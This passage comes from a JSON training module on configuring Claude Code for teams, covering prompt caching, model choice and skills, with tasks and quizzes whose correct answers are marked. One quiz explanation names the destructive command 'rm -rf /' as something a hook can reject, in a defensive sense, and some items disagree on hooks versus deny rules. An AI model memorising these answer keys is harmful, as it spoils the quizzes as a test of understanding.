coding tasks, PR reviews, bug fixes | Sonnet | Best cost/quality ratio for everyday work |\n| Log parsing, documentation lookup, simple transforms | Haiku (subagent) | Fast and cheap for non-reasoning tasks |\n| Subagent coordination tasks | Sonnet | Balances capability and cost for delegation |\n\nSonnet is the practical default for nearly all development work. Reserve Opus for tasks where you have observed Sonnet producing inferior results.\n\n### Model switching invalidates the cache\n\nLike effort level, each model has its own prompt cache. Switching via `/model` mid-session causes the next turn to pay full input rate for the entire conversation history. Switch models at the start of sessions.\n\nThe `opusplan` model setting resolves to Opus during plan mode and Sonnet during execution, so each plan-mode toggle is a model switch that starts a fresh cache. This is a hidden cost for teams that frequently enter and exit plan mode.\n\n### Team-level defaults in committed settings\n\n```json\n// .claude/settings.json\n{\n  \"model\": \"claude-sonnet-4-6\",\n  \"effortLevel\": \"medium\"\n}\n```\n\nSetting these in the committed project settings ensures teammates start on the right model without individual configuration. Team members can override locally via `.claude/settings.local.json` or `~/.claude/settings.json` for their personal preference."
   },
   {
    "heading": "Prompt Caching by Stable Prefix",
    "body": "Prompt caching is the largest single cost reduction mechanism in Claude Code. Without it, every API turn re-processes your full context at full input rates. With it, unchanged prefixes bill at roughly 10% of the standard input rate.\n\n### How the cache is organized\n\nThe API caches by exact prefix match: the start of each request is compared against recent requests. If the prefix matches, cached tokens are served at the cache read rate. The match is exact — a change anywhere in the prefix recomputes everything after it. There is no per-segment or per-file caching.\n\nClaude Code structures each request so the most stable content comes first:\n\n| Layer | Content | Changes when |\n|---|---|---|\n| System prompt | Core instructions, tool definitions, output style | Tool set changes, or Claude Code is upgraded |\n| Project context | CLAUDE.md, auto memory, unscoped rules | Session starts, or after `/clear` or `/compact` |\n| Conversation | Messages, tool calls, tool results | Every turn (new exchange appended) |\n\nNormal turn pattern: the conversation layer grows by one exchange. Everything before it (system prompt + project context) is an exact prefix match and reads from cache at ~10% cost.\n\n### Cache invalidation events — the common team mistakes\n\n| Action | Cache effect | Team impact |\n|---|---|---|\n| `/model` switch mid-session | Full miss — entire history reprocessed | Do not switch models mid-task |\n| `/effort` change mid-session | Full miss — entire history reprocessed; confirmation dialog shown | Set effort at session start |\n| Enabling fast mode mid-session | Full miss on next turn (paid once; subsequent toggles keep cache) | Enable at session start if needed |\n| MCP server connect/disconnect (non-deferred tools) | Full miss | Do not change MCP config mid-session |\n| Enabling/disabling a plugin that provides MCP servers | Full miss (if tools not deferred) | Apply plugin changes at session start |\n| Denying an entire tool (bare tool name in deny list) | Removes tool from context; full miss | Set deny rules before starting work |\n| `/compact` | Conversation layer invalidated; system prompt and project context may re-hit cache | Compact at natural breaks, not mid-task |\n| Claude Code upgrade | System prompt updated; full miss on first turn post-upgrade | Auto-updates apply at restart, not mid-session |\n| Editing CLAUDE.md mid-session | No cache effect (content not sent to API until next session) | CLAUDE.md edits are cache-safe mid-session; take effect after `/clear` |\n\n### Cache lifetime and TTL\n\nCached prefixes expire after a period of inactivity. Two TTLs are available:\n\n- **5-minute TTL**: default for API key, Bedrock, Vertex, Foundry users. Cheaper to write; expires during breaks.\n- **1-hour TTL**: opt in with `ENABLE_PROMPT_CACHING_1H=1`. Writes cost more but keeps the cache warm through interruptions. On Claude subscriptions (Pro/Max/Team), the 1-hour TTL is requested automatically at no extra charge. If you exceed your plan's usage limit and draw on usage credits, Claude Code automatically drops back to the 5-minute TTL.\n\nFor teams on API keys doing long sessions with breaks: `ENABLE_PROMPT_CACHING_1H=1` in managed settings ensures cache survives lunch breaks.\n\n### Cache scope\n\nThe cache is scoped per-machine and per-directory. The system prompt embeds the working directory, platform, shell, OS version, and git status, so two sessions in different directories build different prefixes and miss each other's cache. This includes different git worktrees of the same repository — each worktree has its own working directory.\n\nTwo sessions running in parallel in the same directory share a prefix and can read each other's cache.\n\n### Maximizing team cache hits\n\n1. Commit `CLAUDE.md` and `.claude/settings.json` so all teammates start with the same stable prefix.\n2. Keep CLAUDE.md content stable between sessions. Adding a line to CLAUDE.md invalidates the project context layer on the next session start.\n3. Do not add MCP servers with fully-loaded (non-deferred) schemas unless necessary. Every teammate who adds a different MCP server builds a different prefix.\n4. Run `/compact` at natural task boundaries, not in the middle of active work.\n\n### Checking cache performance\n\n```bash\n/usage\n```\n\nThe session block reports two token counts the API returns on every response:\n\n| Field | Meaning |\n|---|---|\n| `cache_creation_input_tokens` | Tokens written to cache on this turn, billed at cache write rate |\n| `cache_read_input_tokens` | Tokens served from cache at ~10% of standard input rate |\n\nA healthy session has high read-to-creation ratio after the first turn. If `cache_creation_input_tokens` stays high turn after turn, something is changing in your prefix — check the invalidation table above."
   },
   {
    "heading": "Skills: Moving Procedures Out of Context",
    "body": "Skills are the mechanism for keeping CLAUDE.md under 200 lines while preserving team-specific procedures. A skill's body loads only when invoked; its combined `description` + `when_to_use` text is truncated at 1,536 characters total and loads at session start (unless `disable-model-invocation: true`).\n\n### SKILL.md frontmatter reference\n\n```yaml\n---\nname: create-pr          # Display name in skill listings\ndescription: Open a pull request for the current branch. Use when the user asks to create, open, or submit a PR.\nwhen_to_use: \"trigger phrases: 'open a PR', 'submit for review', 'create pull request'\"\ndisable-model-invocation: true   # Only fires when user types /create-pr\nallowed-tools: Bash(git *) Bash(gh *)  # Tools pre-approved without permission prompt\neffort: low                      # Override session effort level for this skill\ncontext: fork                    # Run in a forked subagent\n---\n\n## Create Pull Request\n\n1. Verify `npm run check` passes\n2. Run `git push -u origin HEAD`\n3. Run `gh pr create --fill --draft`\n4. Report the PR URL\n```\n\nAll frontmatter fields are optional except the skill directory name (which determines the `/command`). Only `description` is strongly recommended so Claude knows when to use it.\n\n### Skill locations and priority\n\n| Path | Scope | Priority |\n|---|---|---|\n| Managed settings directory | Org-wide | 1 (highest) |\n| `~/.claude/skills/<name>/SKILL.md` | All your projects | 2 |\n| `.claude/skills/<name>/SKILL.md` | This project | 3 |\n| Plugin `<plugin>/skills/<name>/SKILL.md` | Where plugin enabled | Namespaced as `plugin:skill` |\n\nProject-level skills override personal-level skills with the same name. A project-level `code-review` skill replaces the bundled `/code-review` command.\n\n### When to use a skill vs CLAUDE.md vs a rule\n\n| Content type | Put it in |\n|---|---|\n| Fact Claude needs every session (build command, project layout) | `CLAUDE.md` |\n| Convention Claude needs when editing specific files | Path-scoped rule in `.claude/rules/` |\n| Multi-step procedure Claude executes on request | Skill (`SKILL.md`) |\n| Side-effect procedure (deploy, commit, send-message) | Skill with `disable-model-invocation: true` |\n| Action that must happen every time, unconditionally | Hook in `settings.json` |\n\n### Dynamic context injection\n\nSkills support injecting live shell output before Claude sees the content using the `` !`command` `` syntax:\n\n```yaml\n---\nname: summarize-changes\ndescription: Summarizes uncommitted changes and flags anything risky.\n---\n\n## Current changes\n\n!`git diff HEAD`\n\n## Instructions\n\nSummarize the changes above, then list any risks (missing error handling, hardcoded values, tests needing updates).\n```\n\nThis runs `git diff HEAD` at invocation time and inlines the output. Claude receives actual data, not a command to run. This is the difference between a skill that describes what to do and one that arrives pre-loaded with live context.\n\n### Skill content lifecycle\n\nOnce a skill loads during a session, its content stays in context for the rest of that session. After compaction, invoked skills are re-attached within a combined 25,000-token budget (up to 5,000 tokens per skill), starting from most-recently invoked. Older skills can be dropped entirely if you invoked many in one session. Keep skill bodies concise — state what to do, not why."
   },
   {
    "heading": "Common Pitfalls and Operational Gotchas",
    "body": "These are the failure modes that appear repeatedly in teams adopting shared Claude Code infrastructure.\n\n### CLAUDE.md keeps growing past 200 lines\n\n**Symptom**: Claude ignores instructions at the bottom of a long CLAUDE.md.\n**Root cause**: Length degrades adherence and context is wasted on rarely-needed content.\n**Fix**: Identify sections that are procedures (move to skills) or subsystem-specific (move to path-scoped rules in `.claude/rules/`). Use the section's frequency of relevance as the guide — if it only matters when working on the payment service, it belongs in a path-scoped rule for `src/payments/**`.\n\n### Hooks committed to the project do not work on teammate machines\n\n**Symptom**: Hook command fails with 'not found'.\n**Root cause**: Hook script path uses an absolute personal path, or relies on a globally-installed tool only present on one machine.\n**Fix**: Use `${CLAUDE_PROJECT_DIR}/.claude/hooks/script.sh` for all hook script paths. Commit hook scripts to the repo. For external tools (`prettier`, `ruff`, etc.), reference them via the project's installed path (`./node_modules/.bin/prettier`) rather than a global path.\n\n### Instructions disappear after compaction\n\n**Symptom**: Claude was following a rule during a session, compaction happened, rule is now ignored.\n**Root cause**: The rule was given only in conversation, not in a file. Conversation content becomes the compaction summary, which is lossy.\n**Fix**: Move any instruction that must survive the session into `CLAUDE.md` (for session-wide facts) or a skill (for procedures). Check the compaction survival table above — only disk-backed files are guaranteed to re-inject.\n\n### Effort or model change mid-session causes a slow expensive turn\n\n**Symptom**: One turn is dramatically slower and more expensive than usual.\n**Root cause**: A `/model` or `/effort` change invalidated the entire prompt cache. The next request re-processed your full conversation history at the full input rate.\n**Fix**: Set model and effort level at the very start of a session. If you need to switch models for a task, do it at a natural boundary (after `/compact`) so the conversation to re-process is minimal.\n\n### MCP server changes invalidate cache unexpectedly\n\n**Symptom**: Turns become consistently slower after adding or removing an MCP server.\n**Root cause**: If tool schemas are not deferred (e.g., on Haiku, Vertex AI, or with a custom `ANTHROPIC_BASE_URL`), any change to the MCP server set invalidates the system prompt layer and rebuilds the entire cache.\n**Fix**: Apply MCP config changes at session start. On supported models, verify tool search (deferral) is active — deferred tools do not invalidate the cache on server connect/disconnect.\n\n### Path-scoped rules never fire\n\n**Symptom**: A rule in `.claude/rules/` with `paths:` frontmatter is not being applied.\n**Root cause**: Path-scoped rules trigger when Claude **reads** a file matching the pattern, not on every tool use. If Claude is writing a file without reading it first, or operating on matching files via grep results rather than direct reads, the rule does not fire.\n**Fix**: Rules fire on file reads. If you need a rule to apply universally, remove the `paths:` frontmatter to make it unconditional (accept the context cost). Or structure your prompts so Claude reads the relevant file before editing it.\n\n### `disable-model-invocation` skill gets triggered by Claude anyway\n\n**Symptom**: A deployment or commit skill with `disable-model-invocation: true` runs when Claude decides it is relevant, causing unintended side effects.\n**Root cause**: The frontmatter field is not set, misspelled, or the YAML is malformed and silently falls back to the default (`false`).\n**Fix**: Validate your SKILL.md with a YAML linter. Confirm the skill does not appear in Claude's startup skill listing (it should not appear there if `disable-model-invocation: true` is working). The skill should be invisible to Claude until you type `/skill-name`."
   }
  ],
  "preQuiz": [
   {
    "prompt": "Your team commits a CLAUDE.md to the project root. One developer adds 450 lines of detailed API documentation, reasoning that more context helps Claude. After the next major model release, another developer wants to add a critical architecture rule but finds Claude ignoring it. What is the most likely root cause?",
    "options": [
     "The CLAUDE.md file needs to be placed in ~/.claude/ instead of the project root to be read reliably.",
     "A bloated file causes Claude to ignore real instructions, because important rules are lost in noise — and the full token cost loads on every request.",
     "CLAUDE.md only reads the first 200 lines or 25KB, so the architecture rule was likely truncated.",
     "Detailed API docs belong in CLAUDE.md so Claude can reference them without needing file reads."
    ],
    "correct": 1,
    "sectionIndices": [
     2
    ],
    "explanation": "CLAUDE.md loads its full content every request, inflating context cost everywhere. More critically, a bloated file causes Claude to ignore real instructions — the important rule is lost in noise. The 200-line/25KB cap applies to auto memory (MEMORY.md), not CLAUDE.md."
   },
   {
    "prompt": "A developer runs Claude from a package subdirectory (e.g., `packages/api/`). Which of the following accurately describes what loads?",
    "options": [
     "Only that subdirectory's CLAUDE.md loads; parent CLAUDE.md files are excluded to avoid conflicts.",
     "The subdirectory's CLAUDE.md plus every ancestor's CLAUDE.md load; sibling packages are excluded automatically.",
     "All CLAUDE.md files in the repo load, including sibling packages, because CLAUDE.md is additive.",
     "The repo-root CLAUDE.md takes precedence and the subdirectory CLAUDE.md is ignored unless the root imports it."
    ],
    "correct": 1,
    "sectionIndices": [
     7
    ],
    "explanation": "Launching from a subdirectory loads that directory's CLAUDE.md plus every ancestor's — giving a natural scope stack. Sibling package CLAUDE.md files are not loaded, which is the main reason to launch from a subdirectory when work is scoped there."
   },
   {
    "prompt": "Your team's `.claude/settings.json` defines a deny rule blocking edits to `.env`. A developer opens a git worktree at `/worktrees/feature-branch/`. They find that Claude readily edits `.env` in the worktree. Why?",
    "options": [
     "`settings.json` is only evaluated for PreToolUse hooks, not for permission deny rules.",
     "`settings.json` does NOT inherit from parent directories — it loads only from the starting directory; the worktree root needs its own copy.",
     "The deny rule syntax requires `paths:` frontmatter to apply in worktrees; a plain deny rule only applies to the main working tree.",
     "Deny rules in `settings.json` cover `Read` operations but not `Write` or `Edit` tool calls."
    ],
    "correct": 1,
    "sectionIndices": [
     6
    ],
    "explanation": "Unlike CLAUDE.md, `.claude/settings.json` does NOT inherit from parent directories — it loads only from the starting directory. A worktree session loads settings from the worktree root, so deny rules must also exist there."
   },
   {
    "prompt": "You have a skill that commits and pushes code. You notice it runs in the background and consumes context window space even when not explicitly invoked. What is the correct fix?",
    "options": [
     "Move the skill to `~/.claude/skills/` (user level) instead of the project `.claude/skills/` directory.",
     "Add `disable-model-invocation: true` to the skill's YAML frontmatter so it costs zero context until explicitly invoked with `/name`.",
     "Set the skill description to an empty string so the model does not auto-detect it as relevant.",
     "Use `claudeMdExcludes` in settings.json to suppress the skill from loading until needed."
    ],
    "correct": 1,
    "sectionIndices": [
     3
    ],
    "explanation": "`disable-model-invocation: true` in a skill's frontmatter prevents it from being auto-invoked by the model — it costs zero context until you call it explicitly with `/skill-name`. This is especially important for side-effecting skills like commit/deploy."
   },
   {
    "prompt": "A team member says: 'I added a rule to CLAUDE.md telling Claude never to edit .env, but it edited .env anyway.' What is the architecturally correct fix?",
    "options": [
     "Move the rule to the top of CLAUDE.md and add IMPORTANT: prefix so it gets higher priority.",
     "Add a `PreToolUse` hook in `.claude/settings.json` that blocks edits to `.env` — hooks are enforcement, CLAUDE.md is advisory.",
     "Add the rule to both the global `~/.claude/CLAUDE.md` and the project CLAUDE.md so it appears twice.",
     "Reduce the length of CLAUDE.md so Claude pays more attention to the .env rule."
    ],
    "correct": 1,
    "sectionIndices": [
     3
    ],
    "explanation": "Hooks run deterministically at lifecycle events — a PreToolUse hook can actually block a tool call. CLAUDE.md is advisory; Claude may still override it. Use hooks for anything that *must* happen every time."
   },
   {
    "prompt": "Your team installs an MCP server with 40 tools. After connecting it, you notice session startup is slower and your first-prompt context usage jumps significantly. What is the correct mental model for why this happens, and what should you check first?",
    "options": [
     "MCP servers load all tool schemas upfront at connection time; you should reduce the number of tools defined in the server.",
     "MCP tool names load at startup; full JSON schemas are deferred until a tool is used. But ENABLE_TOOL_SEARCH=false would load ALL schemas upfront — check that setting.",
     "MCP tool names load at startup and add constant overhead; running `/mcp` shows per-server token cost so you can disconnect unused servers.",
     "MCP schemas are compressed before loading; the overhead is from authentication handshakes, not token cost."
    ],
    "correct": 2,
    "sectionIndices": [
     11
    ],
    "explanation": "By default, only MCP tool names load at startup (schemas are deferred). Running `/mcp` shows per-server token cost and connection status — the right first step is to see which servers are expensive and disconnect ones you're not actively using."
   },
   {
    "prompt": "You're mid-session and Claude seems to have forgotten an instruction you gave earlier. You suspect auto-compaction fired. Which of the following correctly describes what was lost vs. what was preserved?",
    "options": [
     "Everything before the compaction point is lost; only the most recent 10 messages survive.",
     "paths:-frontmatter rules and nested subdirectory CLAUDE.md re-inject automatically after compaction; skill bodies are what gets lost.",
     "Project-root CLAUDE.md and auto memory re-inject from disk after compaction; paths:-frontmatter rules and nested subdirectory CLAUDE.md are NOT re-injected until a matching file is re-read.",
     "Auto-compaction preserves all invoked skill bodies in full; what's lost is the project-root CLAUDE.md which must be manually re-read."
    ],
    "correct": 2,
    "sectionIndices": [
     11
    ],
    "explanation": "After compaction, project-root CLAUDE.md, unscoped rules, and auto memory are re-injected from disk. What's lost until a matching file is read: paths:-frontmatter rules and nested subdirectory CLAUDE.md. Invoked skill bodies survive but are capped at 5,000 tokens/skill, truncated keeping the start."
   },
   {
    "prompt": "Your team has three repositories that all need the same set of hooks, a shared MCP server, and two shared skills. Currently each repo has its own copy. When should you package this as a plugin instead?",
    "options": [
     "Immediately — plugins are always preferable to per-repo copies because they eliminate drift.",
     "When a second repository needs the same setup — that is the explicit trigger for packaging as a plugin.",
     "When the number of repos exceeds five — smaller distributions are better managed as symlinks.",
     "Only when the setup includes MCP servers — hooks and skills alone don't justify a plugin."
    ],
    "correct": 1,
    "sectionIndices": [
     3,
     4
    ],
    "explanation": "The incremental trigger rule is explicit: 'Package as a plugin once a second repository needs it.' Below that threshold, per-repo copies are simpler. Plugins bundle skills, hooks, subagents, and MCP servers and are enabled via `enabledPlugins` rather than per-developer installs."
   },
   {
    "prompt": "A subagent is delegated to read 200 large log files and produce a summary. A colleague says: 'The subagent won't have access to our project's CLAUDE.md or the conversation history we built up — we need to pass those in.' Which part of this statement is accurate?",
    "options": [
     "Both parts are wrong — subagents fully inherit conversation history and CLAUDE.md from the parent session.",
     "Subagents do NOT inherit conversation history or auto memory, but they DO get their own copy of CLAUDE.md. The conversation history concern is correct; the CLAUDE.md concern is not.",
     "Subagents inherit both conversation history and CLAUDE.md, but not MCP connections — those must be passed explicitly.",
     "Subagents have their own shorter system prompt and do NOT inherit conversation history or auto memory. But they DO get their own CLAUDE.md copy. Only conversation history needs to be passed explicitly."
    ],
    "correct": 3,
    "sectionIndices": [
     11
    ],
    "explanation": "Subagents run in their own context window with their own shorter system prompt and their own CLAUDE.md copy. They do NOT inherit conversation history or auto memory. Context accumulated in the parent session must be passed explicitly in the subagent prompt."
   },
   {
    "prompt": "At session start, before your first prompt, the context window already has 8,000 tokens consumed. You have a global CLAUDE.md (300 lines), a project CLAUDE.md (150 lines), and 12 MCP servers connected with tool-search enabled. Which component is consuming the most tokens?",
    "options": [
     "The 12 MCP servers, because all tool schemas load at startup even with tool-search enabled.",
     "The global CLAUDE.md at 300 lines, because global files load in full and count against the window.",
     "The system prompt (~4.2K tokens) plus both CLAUDE.md files in full — the 12 MCP servers contribute only tool names with schemas deferred.",
     "Auto memory (MEMORY.md) at up to 25KB, because it loads before CLAUDE.md and is the largest component."
    ],
    "correct": 2,
    "sectionIndices": [
     9,
     10,
     11
    ],
    "explanation": "The system prompt is ~4.2K tokens; CLAUDE.md files load their full content every request. With tool-search enabled (the default), MCP servers contribute only tool names at startup — full JSON schemas are deferred. Auto memory loads up to 200 lines or 25KB, but both CLAUDE.md files together likely exceed that at 450 lines total."
   },
   {
    "prompt": "You notice that after using `/compact`, a skill that was auto-invoked earlier in the session is no longer influencing Claude's behavior. What explains this, and what is the correct architectural fix?",
    "options": [
     "Compaction deletes skills from `.claude/skills/` — you need to reinstall the skill after each compact.",
     "Skill descriptions are NOT re-injected after compaction — only skills you actually invoked persist (capped at 5,000 tokens). If the skill's body was too long, the relevant instructions may have been truncated. Move critical rules into project CLAUDE.md so they survive via disk re-injection.",
     "The skill is still active but compaction resets its priority — use `/skill-name` to re-invoke it explicitly.",
     "Compact strips all skills from context; you need to add `disable-model-invocation: false` to force re-injection."
    ],
    "correct": 1,
    "sectionIndices": [
     3,
     11
    ],
    "explanation": "After compaction, only skills that were actually invoked have their bodies re-injected — and only from the start of the file, capped at 5,000 tokens/skill. Skill descriptions are NOT re-injected. Critical always-needed rules belong in CLAUDE.md (re-injected from disk), not only in skills."
   },
   {
    "prompt": "You want Claude to avoid reading files in `./dist/` and `./vendor/` directories. You add these to `.gitignore`. Are they now excluded from Claude's file reads?",
    "options": [
     "Yes — Claude respects .gitignore for file access, the same way git does.",
     "No — you must add explicit `Read` deny rules in `permissions.deny` in `.claude/settings.json`, e.g. `\"Read(./**/dist/**)\"`. .gitignore does not control Claude's file access.",
     "Partially — .gitignore prevents Claude from reading via glob patterns, but not from direct path reads.",
     "No — you must add the paths to `claudeMdExcludes` in settings.json to block file reads."
    ],
    "correct": 1,
    "sectionIndices": [
     6
    ],
    "explanation": "`.gitignore` controls git tracking, not Claude's file access. To block Claude from reading generated or vendored directories, add explicit `Read` deny rules under `permissions.deny` in `.claude/settings.json`, e.g. `\"Read(./**/dist/**)\"`. Note: these cover built-in file tools and recognized Bash file commands, but don't filter denied paths from recursive-search output."
   },
   {
    "prompt": "Which precedence rule is DIFFERENT from what most people assume when first learning the four config levels (user, project, plugin, managed)?",
    "options": [
     "Skills follow managed > user > project, while CLAUDE.md is additive across all levels (conflicts resolved by Claude's judgment, not guaranteed more-specific wins).",
     "MCP servers follow project > user > local, so a project MCP server always overrides a user-level one.",
     "Hooks are exclusive — only the highest-precedence hook fires; lower-level hooks are suppressed.",
     "Subagents follow user > project > plugin, so user-defined agents always take priority over project agents."
    ],
    "correct": 0,
    "sectionIndices": [
     5
    ],
    "explanation": "The common mistake is assuming CLAUDE.md works like code precedence (more-specific wins). It is actually additive — all levels contribute, and conflicts are resolved by Claude's judgment with no guarantee. MCP servers follow local > project > user. Hooks MERGE — all matching hooks fire regardless of source."
   },
   {
    "prompt": "A developer keeps asking Claude the same multi-step deployment question every session by pasting a long procedure from Confluence. This has happened three times. According to the incremental setup model, what is the correct next action?",
    "options": [
     "Add the deployment procedure to CLAUDE.md so it loads automatically every session.",
     "Add a PreToolUse hook that injects the procedure when deployment-related commands are detected.",
     "Convert the repeated paste into a skill — a repeated prompt becomes a skill on the second time, a pasted multi-step playbook on the third time.",
     "Create a subagent with the procedure hardcoded in its system prompt."
    ],
    "correct": 2,
    "sectionIndices": [
     4
    ],
    "explanation": "The incremental trigger progression is: wrong twice → CLAUDE.md; repeated prompt → user-invocable skill; pasted multi-step playbook by the 3rd time → skill. Adding a 3x-repeated procedure to CLAUDE.md would bloat it with context that only matters for deployment sessions. A skill loads only when invoked."
   },
   {
    "prompt": "You grant `permissions.additionalDirectories` to `/data/shared/` so Claude can read large datasets there. A developer expects Claude to also pick up the CLAUDE.md in `/data/shared/.claude/CLAUDE.md` and auto-invoke skills from that directory. What actually happens?",
    "options": [
     "`additionalDirectories` grants full access: file read/write, CLAUDE.md loading, and skill discovery from that directory.",
     "`additionalDirectories` grants file read/write access only — it never loads that directory's CLAUDE.md, rules, or skills. Use `--add-dir` to also load skills and optionally CLAUDE.md.",
     "`additionalDirectories` loads CLAUDE.md from the added directory but not skills — skills require the directory to be set as the launch directory.",
     "`additionalDirectories` and `--add-dir` behave identically; the difference is only whether the flag is set at runtime or in config."
    ],
    "correct": 1,
    "sectionIndices": [
     6
    ],
    "explanation": "`permissions.additionalDirectories` grants file read/write access but NEVER loads that directory's CLAUDE.md, rules, or skills. To also load skills (and optionally CLAUDE.md via the environment variable `CLAUDE_CODE_ADDITIONAL_DIRECTORIES_CLAUDE_MD=1`), use `--add-dir` or `/add-dir`."
   }
  ],
  "tasks": [
   {
    "id": "stage-8-task-claudemd",
    "afterSectionIdx": 2,
    "title": "Audit and tighten your project CLAUDE.md",
    "instructions": "1. Open (or create) your project's `CLAUDE.md` at the repo root:\n```bash\ncode ./CLAUDE.md\n# or: nano ./CLAUDE.md\n```\n2. For each line, ask: *Would removing this cause Claude to make mistakes on this project?* Delete lines that are:\n   - Inferable from the code itself\n   - Standard conventions (standard git commit format, etc.)\n   - Detailed API documentation (replace with a link)\n   - Never relevant to day-to-day Claude work in this repo\n3. Add `IMPORTANT:` or `YOU MUST` prefixes to any rule you've seen Claude skip.\n4. Check the line count:\n```bash\nwc -l CLAUDE.md\n```\n5. Commit the trimmed file:\n```bash\ngit add CLAUDE.md && git commit -m 'docs: trim CLAUDE.md to actionable instructions only'\n```\n6. Test by starting a new Claude Code session in the repo root and asking Claude to describe its instructions — verify the key rules appear in its answer.",
    "doneWhen": "Your CLAUDE.md is under 200 lines, committed to git, and a fresh Claude Code session can recite at least two of the key project rules you kept."
   },
   {
    "id": "stage-8-task-hooks-deny",
    "afterSectionIdx": 6,
    "title": "Add a PreToolUse hook to block .env edits",
    "instructions": "1. Open (or create) your project's `.claude/settings.json`:\n```bash\nmkdir -p .claude\ncode .claude/settings.json\n```\n2. Add a deny rule for `.env` and a PreToolUse hook. Paste this structure (merge with any existing content):\n```json\n{\n  \"permissions\": {\n    \"deny\": [\n      \"Edit(./.env)\",\n      \"Write(./.env)\"\n    ]\n  }\n}\n```\n3. Save the file, then start a fresh Claude Code session in the project root:\n```bash\nclaude\n```\n4. Ask Claude to edit `.env` (e.g., `\"add a line FOO=bar to .env\"`). Claude should refuse with a permission denial.\n5. Verify the deny rule is being read by running `/memory` inside the session and confirming the project settings loaded.\n6. Commit the settings file:\n```bash\ngit add .claude/settings.json && git commit -m 'config: deny .env edits via Claude Code permissions'  \n```",
    "doneWhen": "When asked to edit `.env`, Claude responds with a permission denial, not a modification — and the settings file is committed to git."
   },
   {
    "id": "stage-8-task-context-check",
    "afterSectionIdx": 11,
    "title": "Inspect your session context and disconnect unused MCP servers",
    "instructions": "1. Start a Claude Code session in a project you actively use:\n```bash\nclaude\n```\n2. Run the context breakdown command:\n```\n/context\n```\nRead the output: note which categories (CLAUDE.md, skills, MCP, conversation) are consuming the most tokens.\n3. Run the MCP status command to see per-server token cost:\n```\n/mcp\n```\nIdentify any servers listed that you have not used in this session (or rarely use).\n4. For each unused server, disconnect it:\n```\n/mcp disconnect <server-name>\n```\n5. Run `/context` again and note the reduction in MCP-attributed token usage.\n6. For servers you routinely don't need in a particular project, add them to the project's `.claude/settings.json` under `mcpServers` with `\"disabled\": true`, or remove them from the project-level MCP config altogether.",
    "doneWhen": "You have run `/context` and `/mcp`, identified at least one unused MCP server, disconnected it, and confirmed the context report shows reduced MCP token cost after disconnection."
   }
  ],
  "visualizations": [
   {
    "id": "stage-8-v",
    "kind": "comparison-table",
    "title": "Optimal use, context & cost",
    "textualSummary": "Key concepts of Optimal use, context & cost: Shared CLAUDE.md, Context as the fundamental constraint, Per-feature precedence and four config levels.",
    "columns": [
     "Concept",
     "In this stage"
    ],
    "rows": [
     {
      "label": "Shared CLAUDE.md",
      "cells": {
       "Concept": {
        "value": "yes"
       },
       "In this stage": {
        "value": "yes"
       }
      }
     },
     {
      "label": "Context as the fundamental constraint",
      "cells": {
       "Concept": {
        "value": "yes"
       },
       "In this stage": {
        "value": "yes"
       }
      }
     },
     {
      "label": "Per-feature precedence and four config levels",
      "cells": {
       "Concept": {
        "value": "yes"
       },
       "In this stage": {
        "value": "yes"
       }
      }
     },
     {
      "label": "Build setup incrementally by trigger",
      "cells": {
       "Concept": {
        "value": "yes"
       },
       "In this stage": {
        "value": "yes"
       }
      }
     }
    ]
   }
  ],
  "confusions": [
   {
    "misconception": "Skipping Optimal use, context & cost.",
    "correction": "Each stage is load-bearing for the setup."
   },
   {
    "misconception": "These concepts are interchangeable.",
    "correction": "Each has a distinct role; see the definitions."
   }
  ],
  "quiz": [
   {
    "id": "stage-8-q1",
    "type": "multiple-choice",
    "prompt": "Your team's CLAUDE.md has grown to 450 lines. Claude now occasionally ignores the 'never commit to main' rule buried on line 380. A teammate suggests adding 'IMPORTANT: NEVER COMMIT TO MAIN' to make it stick. What is the most likely root cause, and what should you do?",
    "options": [
     "Claude doesn't process lines beyond a certain token limit per request, so the rule is being truncated during loading.",
     "The file is too long — important rules are being lost in noise. The fix is to prune lines that don't cause mistakes if removed, not just add emphasis.",
     "The rule phrasing is ambiguous. You should rewrite it with clearer natural language rather than uppercase.",
     "CLAUDE.md reloads from disk only at session start, so a rule added mid-session won't apply until restart."
    ],
    "correct": 1,
    "explanation": "The content states: 'If Claude ignores a rule, the file is probably too long; if it asks questions the file answers, the phrasing is ambiguous.' A 450-line file far exceeds the recommended limit of 200 lines, and important rules get lost in noise. The teammate's instinct to add emphasis isn't wrong (emphasis does help adherence) but it doesn't fix the root cause — the bloat. Option A is wrong: CLAUDE.md full content loads every request, not truncated by line count. Option C mistakes the symptom — 'ignoring' maps to 'too long,' ambiguity maps to 'asking questions.' Option D is wrong: CLAUDE.md loads at session start by design, which is how it works correctly."
   },
   {
    "id": "stage-8-q2",
    "type": "multiple-choice",
    "prompt": "A teammate adds 'never edit .env files' to the project CLAUDE.md. Two days later, Claude edits a .env file while fixing a bug. The teammate escalates. What is the real fix?",
    "options": [
     "Move the rule to the global ~/.claude/CLAUDE.md so it takes precedence over the project file.",
     "Add IMPORTANT: YOU MUST NEVER EDIT .env to increase adherence weight.",
     "Create a PreToolUse hook that blocks writes to .env files — CLAUDE.md is advisory, not enforcement.",
     "Add .env to the permissions.deny list in .claude/settings.json so Claude's file tools skip it."
    ],
    "correct": 2,
    "explanation": "The content explicitly states: 'Use hooks — not CLAUDE.md — for anything that must happen every time: CLAUDE.md is advisory, hooks are enforcement. A PreToolUse hook can block editing .env or reject rm -rf /; \"never edit .env\" in CLAUDE.md is only a request.' A hook deterministically blocks the action; CLAUDE.md cannot guarantee it. Option A is wrong: CLAUDE.md at all levels is additive and conflicts are resolved by Claude's judgment, so global doesn't override project. Option B may increase adherence but still leaves it as advisory — not enforcement. Option D (deny rules) covers built-in file tools and recognized Bash file commands but is specifically for read/write permissions, not a general 'never edit' enforcement — and .env is a specific file, not a directory pattern; a hook is the right fit for this enforcement class."
   },
   {
    "id": "stage-8-q3",
    "type": "multiple-choice",
    "prompt": "Your monorepo has backend/ and frontend/ packages. Claude is launched from the repo root to fix a backend bug. Midway through, it reads a file in frontend/ and picks up a frontend-specific CLAUDE.md with React conventions that conflict with your backend style guide. What mechanism caused this, and how do you prevent it?",
    "options": [
     "Child directory CLAUDE.md files load automatically on session start — move frontend rules to a plugin instead.",
     "Child directory CLAUDE.md files are pulled in on demand when Claude reads a file there. Use claudeMdExcludes with an absolute-path glob to skip the frontend file when launching from root.",
     "Launching from root grants access to every subdirectory's CLAUDE.md at startup. The fix is to always launch from backend/ when doing backend work.",
     "CLAUDE.md files in child directories are never loaded — the conflict must come from a skill description bleeding into context."
    ],
    "correct": 1,
